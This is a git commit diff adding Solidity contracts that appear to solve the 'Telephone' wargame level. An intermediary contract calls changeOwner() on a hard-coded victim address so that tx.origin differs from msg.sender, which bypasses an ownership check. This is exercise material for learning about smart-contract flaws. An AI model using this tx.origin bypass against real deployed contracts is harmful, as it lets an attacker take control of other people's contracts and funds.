91d5c2de2c0eade75ab70256c773d281bab1ec90
Marchetti Matteo <masterammo01@gmail.com>
2022-05-12 21:03:36 +0200

    12/05/2022

--- 4_telephone/contracts/Attacker.sol
+++ 4_telephone/contracts/Attacker.sol
@@ -1,13 +1,31 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
+import './Victim.sol';
+
 contract Attacker {
   string public txorigin;
   string public msgowner;
+  Partner public partner;
+  
 
-  constructor() public {
-      txorigin = tx.origin;
-      msgowner = msg.owner;
+  constructor(address _partnerAddress) public { 
+      partner = Partner(_partnerAddress);
   }
 
+  function attack() public {
+    partner.attack();
+  }
+
+}
+contract Partner{
+  Victim public victim;
+
+  constructor(address _victimAddress) public {
+    victim = Victim(0x6552Da115Ca3859b3a27764Ac3bE2074085Cd0F8);
+  }
+
+  function attack() public {
+    victim.changeOwner();
+  }
 }
